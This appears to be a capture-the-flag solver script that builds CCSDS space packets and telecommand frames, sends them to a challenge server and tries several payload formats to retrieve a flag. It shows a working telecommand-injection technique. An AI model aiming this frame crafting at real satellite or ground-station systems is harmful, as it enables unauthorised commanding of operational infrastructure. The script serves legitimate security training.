#!/usr/bin/env python3
# coding:UTF-8

# -------------------------------------------------------------------------------------
#           PYTHON3 SCRIPT FILE FOR THE REMOTE ANALYSIS OF SPACE CRAFT
#         BY TERENCE BROADBENT MSc DIGITAL FORENSICS & CYBERCRIME ANALYSIS
# -------------------------------------------------------------------------------------

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Load required imports.
# Modified: N/A
# -------------------------------------------------------------------------------------

import argparse
import struct
import time
import json
import sys

from pwn import hexdump, log, remote

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Define application variables
# Modified: N/A
# -------------------------------------------------------------------------------------

config = json.loads(sys.argv[1])

HOST = config["host"]
PORT = int(config["port"])
SPACECRAFT_ID = int(config["spacecraft_id"])
VIRTUAL_CHANNEL_ID = int(config["virtual_channel_id"])
APID = int(config["apid"])
payload = config["payload"]
USER_PAYLOAD = payload.encode("utf-8") if isinstance(payload, str) else payload

# ------------------------------------------------------------------------------------- 
# AUTHOR  : Terence Broadbent                                                    
# CONTRACT: GitHub
# Version : CORE
# Details : Create functional subroutines called from main.
# Modified: N/A
# -------------------------------------------------------------------------------------

def crc16_ccitt_false(data: bytes) -> int:
    crc = 0xFFFF
    for byte in data:
        crc ^= byte << 8
        for _ in range(8):
            if crc & 0x8000:
                crc = ((crc << 1) ^ 0x1021) & 0xFFFF
            else:
                crc = (crc << 1) & 0xFFFF
    return crc

def generate_space_packet(apid: int, packet_count: int, payload: bytes) -> bytes:
    version = 0
    packet_type = 1
    secondary_header = 0
    sequence_flags = 0b11
    packet_id = ((version << 13)|(packet_type << 12)|(secondary_header << 11)|(apid & 0x7FF))
    sequence_control = (sequence_flags << 14) | (packet_count & 0x3FFF)
    packet_data_length = len(payload) - 1
    return struct.pack(">HHH", packet_id, sequence_control, packet_data_length) + payload

def generate_tc_frame(spacecraft_id: int,virtual_channel_id: int,tc_packet_count: int,payload: bytes,) -> bytes:
    version = 0
    bypass_flag = 0
    control_command_flag = 0
    reserved = 0
    first_word = ((version << 14)|(bypass_flag << 13)|(control_command_flag << 12)|(reserved << 10)|(spacecraft_id & 0x3FF))
    total_len = 5 + len(payload) + 2
    frame_length = total_len - 1
    second_word = ((virtual_channel_id & 0x3F) << 10) | (frame_length & 0x3FF)
    frame = struct.pack(">HHB", first_word, second_word, tc_packet_count & 0xFF) + payload
    frame += struct.pack(">H", crc16_ccitt_false(frame))
    return frame

def encode_app_command(counter: int, command: bytes) -> bytes:
    return f"0x{counter:02x}:".encode() + command

def parse_space_packet(data: bytes, offset: int):
    if len(data) - offset < 7:
        return None
    packet_id, sequence_control, data_length = struct.unpack_from(">HHH", data, offset)
    version = (packet_id >> 13) & 0x7
    apid = packet_id & 0x7FF
    packet_count = sequence_control & 0x3FFF
    payload_len = data_length + 1
    end = offset + 6 + payload_len
    if version != 0 or end > len(data):
        return None
    return {
        "apid": apid,
        "packet_count": packet_count,
        "payload": data[offset + 6:end],
        "end": end,
    }

def find_space_packet(data: bytes, expected_apid: int):
    for offset in range(len(data) - 6):
        packet = parse_space_packet(data, offset)
        if packet and packet["apid"] == expected_apid:
            return packet
    return None

def parse_app_payload(payload: bytes):
    if len(payload) >= 5 and payload[:2].lower() == b"0x" and payload[4:5] == b":":
        counter = int(payload[2:4], 16)
        body = payload[5:]
        return counter, body
    raise ValueError(f"unexpected application payload: {payload!r}")

def parse_response(response: bytes):
    packet = find_space_packet(response, APID)
    if packet:
        payload = packet["payload"]
        log.info(f"Space Packet payload: {payload!r}")
        return parse_app_payload(payload)
    marker = response.find(b"0x")
    if marker != -1:
        return parse_app_payload(response[marker:].splitlines()[0])
    raise ValueError(f"no application payload found in response: {response!r}")

def recv_response(r, timeout: float = 4.0) -> bytes:
    chunks = []
    deadline = time.time() + timeout
    while time.time() < deadline:
        try:
            chunk = r.recv(timeout=0.5)
        except EOFError:
            log.warning("Remote closed the connection while waiting for a response")
            break
        if not chunk:
            continue
        chunks.append(chunk)
        response = b"".join(chunks)
        if any(marker in response for marker in (b"ACK", b"FLAG", b"CTF{", b"HTB{", b"APPLICATION:")):
            return response
    return b"".join(chunks)

def send_app_payload(r, tc_count: int, packet_count: int, app_payload: bytes):
    space_packet = generate_space_packet(apid=APID,packet_count=packet_count,payload=app_payload,)
    frame = generate_tc_frame(spacecraft_id=SPACECRAFT_ID,virtual_channel_id=VIRTUAL_CHANNEL_ID,tc_packet_count=tc_count,payload=space_packet,)
    log.info(f"Application payload: {app_payload!r}")
    log.info(f"Sending {len(frame)} bytes")
    log.info(hexdump(frame))
    r.send(frame)
    response = recv_response(r)
    log.info(f"Raw response: {response!r}")
    if response:
        log.info(hexdump(response))
    return response

def send_command(r, tc_count: int, packet_count: int, counter: int, command: bytes):
    return send_app_payload(r,tc_count=tc_count,packet_count=packet_count,app_payload=encode_app_command(counter, command),)

def run_once(flag_payload_builder):
    r = remote(HOST, PORT)
    begin_response = send_command(r,tc_count=0,packet_count=0,counter=0,command=b"BEGIN",)
    counter, body = parse_response(begin_response)   
    log.info(f"BEGIN counter={counter}, body={body!r}")
    if b"ACK" not in body:
        log.failure("BEGIN did not return ACK")
        r.close()
        return False
    flag_payload = flag_payload_builder(counter)
    flag_response = send_app_payload(r,tc_count=1,packet_count=1,app_payload=flag_payload,)
    try:
        _, flag_body = parse_response(flag_response)
        log.success(f"Flag response: {flag_body!r}")
        r.close()
        return True
    except ValueError:
        log.info("Could not parse flag response as a Space Packet; raw response above may contain the flag.")
    r.close()
    return b"invalid payload" not in flag_response and b"Expected " not in flag_response

def main():
    attempts = [
        ("0xNN:PAYLOAD", lambda counter: encode_app_command(counter, USER_PAYLOAD)),
        ("0xNN+1:PAYLOAD", lambda counter: encode_app_command((counter + 1) & 0xFF, USER_PAYLOAD)),
        ("NN:PAYLOAD", lambda counter: f"{counter:02x}:".encode() + USER_PAYLOAD),
        ("0xNNGETPAYLOAD", lambda counter: f"0x{counter:02x}".encode() + USER_PAYLOAD),
    ]
    for name, builder in attempts:
        log.info(f"Trying USER_PAYLOAD payload format: {name}")
        if run_once(builder):
            return
    log.failure("All targeted USER_PAYLOAD payload formats were rejected")

if __name__ == "__main__":
    main()